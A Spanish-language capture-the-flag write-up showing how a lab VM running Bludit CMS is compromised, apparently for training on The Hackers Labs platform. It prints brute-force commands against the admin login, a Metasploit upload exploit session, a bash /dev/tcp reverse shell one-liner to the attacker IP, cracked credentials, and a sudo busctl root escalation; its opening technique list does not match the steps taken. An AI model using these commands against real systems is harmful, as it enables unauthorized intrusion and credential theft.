- Tags: #Bludit
# Writeup Template: Maquina `[ JaulaCon2025 ]`
- **Enumeración de aplicación web**: Exploración de contenido web visible y oculto para detectar puntos de entrada.
- **Enumeración de permisos sudo**: Revisión de los comandos que un usuario puede ejecutar como root sin contraseña.
- **Enumeración de servicios**: Identificación de los servicios que corren en los puertos abiertos, incluyendo versiones.
- **Escalada de privilegios con 'python' (GTFOBins)**: Aprovechamiento del binario 'python' con sudo para invocar shells como root.
- **Escaneo de puertos TCP**: Detección de puertos abiertos en la máquina objetivo mediante escaneo TCP.
- **Explotación con Metasploit**: Uso de la herramienta Metasploit para lanzar exploits conocidos contra servicios vulnerables.
- **Fuerza bruta de SSH**: Ataque de diccionario para obtener acceso a través del servicio SSH.

- Tags: #JaulaCon2025
- Dificultad: `[ Facil ]`
- Plataforma: `[ The Hackers Labs ]`

---
## Configuracion del Entorno
**Nota:** Pagina oficcioal donde descargo los laboratorios: [The Hackers Labs](https://labs.thehackerslabs.com/)
- Descargamos el archivo **( .ova )**
- Descomprimimos el archivo **zip**
- Importamos el **ova** en **virtualBox**

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
# Reconocimiento del targetd
sudo arp-scan -I wlan0 --localnet --ignoredups

192.168.100.30  08:00:27:9a:9b:16       PCS Systemtechnik GmbH
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 192.168.100.30 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 192.168.100.30
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 192.168.100.30 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.100.30 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 192.168.100.30 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
192.168.100.30 jaulacon2025.thl
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://jaulacon2025.thl/
http://jaulacon2025.thl/ [200 OK] Apache[2.4.62], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.100.30], JQuery, MetaGenerator[Bludit], Script, Title[Bienvenido a Bludit | BLUDIT], X-Powered-By[Bludit]
```
### Descubrimiento de Archivos y Rutas
```bash
gobuster dir --no-color -u http://jaulacon2025.thl/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 50 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/0                    (Status: 200) [Size: 4541]
/admin                (Status: 301) [Size: 0] [--> http://jaulacon2025.thl/admin/]
/install.php          (Status: 200) [Size: 30]
/robots.txt           (Status: 200) [Size: 22]
/LICENSE              (Status: 200) [Size: 1083]
```

Revisando el archvio **robots** tenemos lo siguiente:
```bash
http://jaulacon2025.thl/robots.txt
```

- **`User-agent: *`**: Se aplica a todos los bots o rastreadores web.
- **`Allow: /`**: Permite el acceso a todo el contenido del sitio web (no hay restricciones).
Si este archivo está expuesto y no hay restricciones (`Disallow`), podría considerarse una práctica riesgosa en ciertos contextos, ya que:
1. **Exposición de rutas sensibles**: Si hay directorios o archivos confidenciales (como `/admin`, `/backup`, `/config`), un atacante podría descubrirlos fácilmente.
2. **Falta de restricciones**: Un `robots.txt` sin `Disallow` no protege información sensible.
```bash
User-agent: *
Allow:
```

Sabiendo esto tenemos un directorio **admin** que podemos revisar para intentar acceder a el
Tenemos un panel de login, el cual podemos auditar para ver si es vulnerable a inyecciones:
```bash
http://jaulacon2025.thl/admin/
```

# Análisis del Código JavaScript/jQuery

#### Función `showAlert(text)`
```javascript
function showAlert(text) {
    console.log("[INFO] Function showAlert() called.");
    $("#alert").html(text);
    $("#alert").slideDown().delay(3000).slideUp();
}
```
##### Explicación:
1. **`console.log()`**: Registra un mensaje en la consola del navegador para propósitos de depuración.
2. **`$("#alert").html(text)`**: 
   - Selecciona el elemento con ID `alert` (debería ser un elemento HTML como `<div id="alert">`)
   - Establece su contenido HTML al texto proporcionado
3. **`slideDown().delay(3000).slideUp()`**:
   - `slideDown()`: Hace que el elemento aparezca deslizándose hacia abajo
   - `delay(3000)`: Espera 3000 milisegundos (3 segundos)
   - `slideUp()`: Oculta el elemento deslizándolo hacia arriba
#### Llamada a la función
```javascript
setTimeout(function(){ 
    showAlert("Nombre de usuario o contraseña incorrectos") 
}, 500);
```
##### Explicación:
- Usa `setTimeout` para retrasar la ejecución:
  - Espera 500ms (medio segundo)
  - Luego llama a `showAlert` con el mensaje de error
#### Evento de clic
```javascript
$(window).click(function() {
    $("#alert").hide();
});
```
### Explicación:
- Establece un manejador de eventos para clics en cualquier parte de la ventana
- Cuando ocurre un clic, oculta inmediatamente el elemento de alerta (`#alert`)
```html
<div id="alert" class="alert alert-danger" style="display: none;">Nombre de usuario o contraseña incorrectos</div>
```
##### Flujo completo
1. Medio segundo después de cargar la página, aparece la alerta
2. La alerta se muestra durante 3 segundos
3. Si el usuario hace clic en cualquier parte, la alerta desaparece inmediatamente
4. Si no hay interacción, la alerta se oculta automáticamente después de 3 segundos
Este es un patrón común para mostrar mensajes de error temporales en aplicaciones web.

## Explotacion de Vulnerabilidades
### Vector de Ataque
Despues de intentar inyeciones **SQL** determinamos que no es vulnerable, Ahora tenemos que investigar mas sobre el gestor **CMSBludit**
**Bludit** es un sistema de gestión de contenidos (CMS) **ligero, rápido y basado en archivos planos** (sin necesidad de base de datos). Es ideal para sitios web pequeños y medianos, blogs y proyectos personales.
**Estructura Basica**
```bash
/bl-content/       # Contenido, configuraciones y datos
   /pages/         # Páginas y entradas en formato JSON
   /uploads/       # Archivos subidos
   /databases/     # Configuraciones del sitio
/themes/           # Plantillas de diseño
/plugins/          # Extensiones
```

Investigando in internet vemos que este gestor bloqueta intento de ataque de fuerza bruta, por lo que tenemos que ver la manera de **bypassear** esta medida de seguridad
Para este caso, Usaremos un exploit en python del autor [CuriosidadesHackers](https://github.com/CuriosidadesDeHackers/Bludit-3.9.2-Auth-Bypass/tree/main)
**Nota Importante** Antes de ejecutar el exploit tenemos que usar un entorno virtual ya que usa librerias de python2
```bash
# Jaula es el nombre de mi entorno virutal
python3 -m venv jaula
```

Activamos el enotorno virutal
```bash
source jaula/bin/activate
```

Ahora nos metemos en el entorno, y coclonamos el proyecto que nos permitira realizar fuerza bruta
```bash
git clone https://github.com/tu-usuario/Bludit-BruteForce-Bypass.git
```

Ahora nos metenemois al proyecto clonado para instalar las librerias de python2
```bash
pip install pwn colorama tqdm
```

Una ves installadas las librerias correctamente, creamos un diccionario con el siguiente nombre:
```bash
users.txt

# contenido
Jaulacon2025
juliacon2025
```

### Ejecucion del Ataque
Ya con el diccionario procedemos a realizar el ataque de fuerza bruta
```bash
python3 Bludit-Auth-Bypass.py -l http://jaulacon2025.thl/admin/login -u user.txt -p /usr/share/wordlists/rockyou.txt
```

Como resultado obtenemos las credenciales correctas de acceso:
```bash
Probando credenciales:   0% | | 999/28688784 [00:29<234:00:54, 34.05credencial/s]

[*] ¡ÉXITO!
[+] Usar credencial -> Jaulacon2025:cassandra
```

Si intentamos conectarnos por ssh con esas credenciales para ver si existe reutilizacion de credenciales, no tuvimos exito
```bash
ssh Jaulacon2025@192.168.100.30 # cassandra
```

Ahora si nos loguemos con esas credenciales en el panel de administracion si que podemos acceder
```bash
http://jaulacon2025.thl/admin/login

username: Jaulacon2025
password: cassandra
```

Despues de intentar manualmente ganar acceso al objetivo, usaremos **metasploit**
### Intrusion
Iniciamos **metasPloit**
```bash
msfconsole
```

Buscamos un exploit para el gestor **CMSBludit**
```bash
search bludit
```

Ahora nos sale este resutaldo:
```bash
 #  Name                                          Disclosure Date  Rank       Check  Description
 -  ----                                          ---------------  ----       -----  -----------
 0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability
```

Seleccionamos el numero 0:
```bash
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
```

Ahora verificamos las opciones que tenemos que configurar:
```bash
show options
```

Vemos que por defecto ya carga nuestra ip de atacante
```bash
Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.100.24   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:
   Id  Name
   --  ----
   0   Bludit v3.9.2
```

Ahora seteamos al objetivo:
```bash
msf6 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS cassandra
BLUDITPASS => cassandra
msf6 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER Jaulacon2025
BLUDITUSER => Jaulacon2025
msf6 exploit(linux/http/bludit_upload_images_exec) > set RHOSTS jaulacon2025.thl
RHOSTS => jaulacon2025.thl
```

Ahora ejecutamos el exploit:
```bash
msf6 exploit(linux/http/bludit_upload_images_exec) > run
[*] Started reverse TCP handler on 192.168.100.24:4444 
[+] Logged in as: Jaulacon2025
[*] Retrieving UUID...
[*] Uploading YWbngXqUYW.png...
[*] Uploading .htaccess...
[*] Executing YWbngXqUYW.png...
[*] Sending stage (40004 bytes) to 192.168.100.30
[+] Deleted .htaccess
[*] Meterpreter session 1 opened (192.168.100.24:4444 -> 192.168.100.30:45296) at 2025-08-01 19:14:49 +0000
```

Una ves ganado el acceso, Corremos una **shell**
```bash
meterpreter > shell
Process 3657 created.
Channel 0 created.
```

Ahora para tener una consola interactiva fuera de metasploit nos ponemos en escucha:
```bash
nc -nlvp 443
```

Ejecutamos desde metasploit el siguiente comando:
```bash
bash -c 'exec bash -i &>/dev/tcp/192.168.100.24/443 <&1'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Enumeracion de usuarios del sistema
cat /etc/passwd | grep "sh"
root:x:0:0:root:/root:/bin/bash
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
JaulaCon2025:x:1001:1001::/home/JaulaCon2025:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Listando los archivos tenemso lo siguiente:
```bash
ls -la databases/

drwxr-xr-x 3 www-data www-data    4096 Mar 25 19:57 .
drwxr-xr-x 7 www-data www-data    4096 Mar 25 19:34 ..
-rw-r--r-- 1 www-data www-data     442 Aug  1 20:57 categories.php
-rw-r--r-- 1 www-data www-data    2331 Aug  1 20:57 pages.php
drwxr-xr-x 7 www-data www-data    4096 Mar 25 19:34 plugins
-rw-r--r-- 1 www-data www-data 1045489 Aug  1 20:13 security.php
-rw-r--r-- 1 www-data www-data    1430 Mar 26 12:39 site.php
-rw-r--r-- 1 www-data www-data    2344 Aug  1 20:57 syslog.php
-rw-r--r-- 1 www-data www-data      52 Aug  1 20:57 tags.php
-rw-r--r-- 1 www-data www-data    1892 Aug  1 20:27 users.php
```

Tenemso un archivo **users** que si miramos su contenido
```php
"JaulaCon2025": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "551211bcd6ef18e32742a73fcb85430b",
        "salt": "jejej",
        "email": "",
        "registered": "2025-03-25 19:43:25",
        "tokenRemember": "",
        "tokenAuth": "d1ed37a30b769e2e48123c3efaa1e357",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
```

Desde nuestra maquina de atacante comprobamos que es **md5**
```bash
hashid 551211bcd6ef18e32742a73fcb85430b
Analyzing '551211bcd6ef18e32742a73fcb85430b'
[+] MD2 
[+] MD5
```

Usando un recurso **only** obtenemos la password
```bash
551211bcd6ef18e32742a73fcb85430b : Brutales
```

Ganamos acceso como este usuario:
```bash
su JaulaCon2025 # ( Brutales )
```
###### Usuario `[ JaulaCon2025 ]`:
Flag usuario:
```bash
user.txt
```

LIsanto los permios para este usuario tenemos lo siguiente:
```bash
sudo -l

User JaulaCon2025 may run the following commands on JaulaCon2025:
    (root) NOPASSWD: /usr/bin/busctl
```

Nos aprovechamos de esta binario para ganar acceso como root
```bash
# Comando para escalar al usuario: ( root )
udo -u root /usr/bin/busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
sudo: unable to resolve host JaulaCon2025: No existe ninguna dirección asociada al nombre
```

---

## Evidencia de Compromiso
Forzamos una bash
```bash
# script /dev/null -c bash
```

Flag de root
```bash
root@JaulaCon2025:/home/JaulaCon2025# /root/root.txt 
```

```bash
# Captura de pantalla o output final
root@JaulaCon2025:/home/JaulaCon2025# whoami
root
```